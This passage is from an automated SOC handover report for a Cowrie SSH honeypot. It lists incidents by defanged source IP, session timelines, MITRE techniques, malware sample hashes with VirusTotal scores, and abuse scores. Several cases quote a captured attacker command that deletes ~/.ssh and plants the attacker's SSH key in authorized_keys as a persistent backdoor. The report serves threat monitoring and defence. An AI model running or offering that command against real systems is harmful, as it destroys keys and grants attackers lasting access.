- [ ] Submit `203.228.30[.]198` to AbuseIPDB if not already reported
- [ ] Block `203.228.30[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65ea57a667d2

| Field | Detail |
|---|---|
| **Source IP** | `203.228.30[.]198` |
| **First Seen** | 2026-05-02 14:27 |
| **Last Seen** | 2026-05-02 14:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:27:44` | `cowrie.session.connect` |
| `2026-05-02 14:27:44` | `cowrie.client.version` |
| `2026-05-02 14:27:44` | `cowrie.client.kex` |
| `2026-05-02 14:27:45` | `cowrie.login.success` |
| `2026-05-02 14:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.228.30[.]198` to AbuseIPDB if not already reported
- [ ] Block `203.228.30[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-848667aefb00

| Field | Detail |
|---|---|
| **Source IP** | `152.53.22[.]186` |
| **First Seen** | 2026-05-02 14:28 |
| **Last Seen** | 2026-05-02 14:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:28:24` | `cowrie.session.connect` |
| `2026-05-02 14:28:24` | `cowrie.client.version` |
| `2026-05-02 14:28:24` | `cowrie.client.kex` |
| `2026-05-02 14:28:25` | `cowrie.login.success` |
| `2026-05-02 14:28:25` | `cowrie.session.params` |
| `2026-05-02 14:28:25` | `cowrie.command.input` |
| `2026-05-02 14:28:25` | `cowrie.command.failed` |
| `2026-05-02 14:28:25` | `cowrie.log.closed` |
| `2026-05-02 14:28:26` | `cowrie.session.params` |
| `2026-05-02 14:28:26` | `cowrie.command.input` |
| `2026-05-02 14:28:26` | `cowrie.session.file_download` |
| `2026-05-02 14:28:26` | `cowrie.log.closed` |
| `2026-05-02 14:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.22[.]186` to AbuseIPDB if not already reported
- [ ] Block `152.53.22[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49f2e43a39d3

| Field | Detail |
|---|---|
| **Source IP** | `152.53.22[.]186` |
| **First Seen** | 2026-05-02 14:28 |
| **Last Seen** | 2026-05-02 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:28:28` | `cowrie.session.connect` |
| `2026-05-02 14:28:28` | `cowrie.client.version` |
| `2026-05-02 14:28:28` | `cowrie.client.kex` |
| `2026-05-02 14:28:28` | `cowrie.login.success` |
| `2026-05-02 14:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.53.22[.]186` to AbuseIPDB if not already reported
- [ ] Block `152.53.22[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5307baf784

| Field | Detail |
|---|---|
| **Source IP** | `203.228.30[.]198` |
| **First Seen** | 2026-05-02 14:31 |
| **Last Seen** | 2026-05-02 14:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:31:24` | `cowrie.session.connect` |
| `2026-05-02 14:31:24` | `cowrie.client.version` |
| `2026-05-02 14:31:24` | `cowrie.client.kex` |
| `2026-05-02 14:31:25` | `cowrie.login.success` |
| `2026-05-02 14:31:25` | `cowrie.session.params` |
| `2026-05-02 14:31:25` | `cowrie.command.input` |
| `2026-05-02 14:31:25` | `cowrie.command.failed` |
| `2026-05-02 14:31:25` | `cowrie.log.closed` |
| `2026-05-02 14:31:25` | `cowrie.session.params` |
| `2026-05-02 14:31:25` | `cowrie.command.input` |
| `2026-05-02 14:31:25` | `cowrie.session.file_download` |
| `2026-05-02 14:31:25` | `cowrie.log.closed` |
| `2026-05-02 14:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.228.30[.]198` to AbuseIPDB if not already reported
- [ ] Block `203.228.30[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3857c7cccebe

| Field | Detail |
|---|---|
| **Source IP** | `203.228.30[.]198` |
| **First Seen** | 2026-05-02 14:31 |
| **Last Seen** | 2026-05-02 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:31:28` | `cowrie.session.connect` |
| `2026-05-02 14:31:28` | `cowrie.client.version` |
| `2026-05-02 14:31:28` | `cowrie.client.kex` |
| `2026-05-02 14:31:28` | `cowrie.login.success` |
| `2026-05-02 14:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.228.30[.]198` to AbuseIPDB if not already reported
- [ ] Block `203.228.30[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae88e28778ee

| Field | Detail |
|---|---|
| **Source IP** | `161.35.205[.]74` |
| **First Seen** | 2026-05-02 14:40 |
| **Last Seen** | 2026-05-02 14:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:40:12` | `cowrie.session.connect` |
| `2026-05-02 14:40:12` | `cowrie.client.version` |
| `2026-05-02 14:40:13` | `cowrie.client.kex` |
| `2026-05-02 14:40:13` | `cowrie.login.success` |
| `2026-05-02 14:40:14` | `cowrie.session.params` |
| `2026-05-02 14:40:14` | `cowrie.command.input` |
| `2026-05-02 14:40:14` | `cowrie.command.failed` |
| `2026-05-02 14:40:14` | `cowrie.log.closed` |
| `2026-05-02 14:40:15` | `cowrie.session.params` |
| `2026-05-02 14:40:15` | `cowrie.command.input` |
| `2026-05-02 14:40:15` | `cowrie.session.file_download` |
| `2026-05-02 14:40:15` | `cowrie.log.closed` |
| `2026-05-02 14:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.205[.]74` to AbuseIPDB if not already reported
- [ ] Block `161.35.205[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6acbff52bdd8

| Field | Detail |
|---|---|
| **Source IP** | `161.35.205[.]74` |
| **First Seen** | 2026-05-02 14:40 |
| **Last Seen** | 2026-05-02 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 14:40:17` | `cowrie.session.connect` |
| `2026-05-02 14:40:18` | `cowrie.client.version` |
| `2026-05-02 14:40:18` | `cowrie.client.kex` |
| `2026-05-02 14:40:19` | `cowrie.login.success` |
| `2026-05-02 14:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.205[.]74` to AbuseIPDB if not already reported
- [ ] Block `161.35.205[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `125.91.140[.]135` | **30** | 2026-05-02 14:23 | 2026-05-02 14:44 | 54m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.53.22[.]186` | **30** | 2026-05-02 14:03 | 2026-05-02 14:28 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `203.228.30[.]198` | **30** | 2026-05-02 14:12 | 2026-05-02 14:41 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.174.114[.]50` | **13** | 2026-05-02 14:17 | 2026-05-02 14:50 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.107[.]50` | **8** | 2026-05-02 14:14 | 2026-05-02 14:44 | 14m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `1.14.73[.]146` | 1 | 2026-05-02 14:51 | 2026-05-02 14:51 | 30s | 0 | `T1592` | 🟢 LOW |
| `105.155.196[.]34` | 1 | 2026-05-02 13:54 | 2026-05-02 13:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.6[.]79` | 1 | 2026-05-02 14:18 | 2026-05-02 14:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.52.15[.]213` | 1 | 2026-05-02 13:54 | 2026-05-02 13:54 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.89.170[.]227` | 1 | 2026-05-02 13:20 | 2026-05-02 13:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `161.35.205[.]74` | 1 | 2026-05-02 14:40 | 2026-05-02 14:40 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.242.226[.]19` | 1 | 2026-05-02 13:26 | 2026-05-02 13:26 | 9s | 0 | `T1592` | 🟢 LOW |
| `75.132.0[.]152` | 1 | 2026-05-02 13:44 | 2026-05-02 13:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]107` | 1 | 2026-05-02 14:13 | 2026-05-02 14:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]185` | 1 | 2026-05-02 14:11 | 2026-05-02 14:11 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]187` | 1 | 2026-05-02 14:11 | 2026-05-02 14:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]190` | 1 | 2026-05-02 14:11 | 2026-05-02 14:11 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]2` | 1 | 2026-05-02 14:13 | 2026-05-02 14:13 | 1s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]219` | 1 | 2026-05-02 14:11 | 2026-05-02 14:11 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `105.155.196[.]34` | MA | ADSL_Maroc_telecom | **100** ⚠️ | 1 |
| `161.35.205[.]74` | DE | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `91.196.152[.]107` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `103.174.114[.]50` | ID | PT. AwanBit Data Indonesia | **100** ⚠️ | 50 |
| `106.12.6[.]79` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `152.52.15[.]213` | IN | BHARTI-AIRTEL | **100** ⚠️ | 50 |
| `91.196.152[.]219` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `91.196.152[.]185` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `203.228.30[.]198` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `1.14.73[.]146` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 138 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 80 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |

---

## 🔕 False Positive Summary (847 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 841 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 992 cases |
| Tool 34  | Credential Extractor        | ✅ 100 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 847 filtered (85.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 20 priority case(s) shown individually · 19 recon entry/entries in table (5 group(s) consolidating 111 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-02T14:53:32Z_
